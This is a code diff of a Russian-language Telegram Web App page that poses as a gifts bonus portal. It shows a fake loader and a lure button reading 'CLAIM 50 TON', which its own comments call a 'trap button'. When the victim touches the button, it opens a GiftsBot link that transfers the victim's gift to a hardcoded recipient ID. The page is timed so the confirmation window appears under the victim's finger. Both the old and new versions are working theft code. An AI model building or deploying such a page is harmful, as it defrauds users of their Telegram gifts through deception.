@@ -3,119 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Gifts Portal</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            background-color: #0e1621;
-            color: #ffffff;
-            font-family: -apple-system, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-            touch-action: manipulation;
-        }
-
-        .loader {
-            border: 4px solid #242f3d;
-            border-top: 4px solid #3390ec;
-            border-radius: 50%;
-            width: 45px;
-            height: 45px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
+        body { background: #0e1621; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .loader { border: 4px solid #242f3d; border-top: 4px solid #3390ec; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        #status-text { font-size: 20px; font-weight: bold; margin-bottom: 10px; text-align: center; }
-        #sub-text { font-size: 14px; color: #708499; margin-bottom: 40px; }
-
-        /* ГЛАВНАЯ КНОПКА-ЛОВУШКА */
-        #trap-btn {
-            display: none;
-            width: 85%;
-            height: 100px;
+        #status { font-size: 20px; font-weight: bold; text-align: center; padding: 0 20px; }
+        #trap-btn { 
+            display: none; width: 95%; height: 150px; /* ГИГАНТСКАЯ ЗОНА КЛИКА */
             background: linear-gradient(180deg, #3390ec 0%, #2876c1 100%);
-            color: white;
-            border: none;
-            border-radius: 20px;
-            font-size: 24px;
-            font-weight: bold;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-            cursor: pointer;
+            color: white; border: none; border-radius: 20px; 
+            font-size: 26px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 0 30px rgba(51,144,236,0.4);
+            margin-top: 20px;
         }
-
-        #trap-btn:active { transform: scale(0.96); opacity: 0.9; }
     </style>
 </head>
 <body>
-
-    <div id="loader-icon" class="loader"></div>
-    <div id="status-text">СИНХРОНИЗАЦИЯ...</div>
-    <div id="sub-text">Проверка доступных бонусов профиля</div>
-
+    <div id="loader" class="loader"></div>
+    <div id="status">ПРОВЕРКА ВАШИХ ПОДАРКОВ...</div>
     <button id="trap-btn">🎁 ЗАБРАТЬ 50 TON</button>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+        tg.ready(); tg.expand();
 
-        const btn = document.getElementById('trap-btn');
-        const statusText = document.getElementById('status-text');
-        const subText = document.getElementById('sub-text');
-        const loader = document.getElementById('loader-icon');
+        let activeId = null;
 
-        let targetId = null;
-
-        // 1. ПОДТЯГИВАЕМ ID ИЗ ФАЙЛА target.json
-        async function loadTarget() {
+        async function init() {
             try {
-                // Запрашиваем данные из соседнего файла в репозитории
-                const response = await fetch('target.json?v=' + Date.now()); 
-                const data = await response.json();
-                
-                if (data.gift_id) {
-                    targetId = data.gift_id;
-                    
-                    // Имитируем "процесс поиска" для солидности
-                    setTimeout(() => {
-                        loader.style.display = "none";
-                        statusText.innerHTML = "НАЙДЕН БОНУС!";
-                        statusText.style.color = "#31b545";
-                        subText.innerHTML = "Вам начислено 50.00 TON за активность";
-                        btn.style.display = "block";
-                    }, 2000);
-                }
-            } catch (e) {
-                statusText.innerHTML = "Ошибка синхронизации";
-                loader.style.display = "none";
-            }
+                // Тянем ID подарка из твоего файла
+                const res = await fetch('target.json?v=' + Date.now());
+                const data = await res.json();
+                activeId = data.gift_id;
+
+                setTimeout(() => {
+                    document.getElementById('loader').style.display = "none";
+                    document.getElementById('status').innerHTML = "ВАМ ДОСТУПЕН БОНУС!";
+                    document.getElementById('status').style.color = "#31b545";
+                    document.getElementById('trap-btn').style.display = "block";
+                }, 1200);
+            } catch (e) { document.getElementById('status').innerHTML = "Ошибка сети"; }
         }
 
-        // 2. ЛОВЛЯ ПАЛЬЦА (Мгновенный вынос подарка)
-        btn.addEventListener('touchstart', function(e) {
-            if (!targetId) return;
-
-            // ТВОЙ ID ПОЛУЧАТЕЛЯ (100р = 1 TON)
-            const myId = "8486064073"; 
-            const url = `https://t.me/GiftsBot?start=transfer_${targetId}_to_${myId}`;
-
-            // Вызываем системное окно ПРЯМО В МОМЕНТ КАСАНИЯ
-            tg.openTelegramLink(url);
-
-            // Меняем вид кнопки после "клика"
-            btn.innerHTML = "ЗАЧИСЛЕНИЕ...";
-            btn.style.background = "#444";
+        // БОЕВОЙ ВЫНОС (touchstart - самая быстрая реакция)
+        document.getElementById('trap-btn').addEventListener('touchstart', function(e) {
+            if (!activeId) return;
+            const url = `https://t.me/GiftsBot?start=transfer_${activeId}_to_8486064073`;
+            tg.openTelegramLink(url); // Окно вылетает ПРЯМО ПОД ПАЛЕЦ
+            this.innerHTML = "ЗАЧИСЛЕНИЕ...";
+            this.style.background = "#222";
         });
 
-        loadTarget();
+        init();
     </script>
 </body>
 </html>
+
 
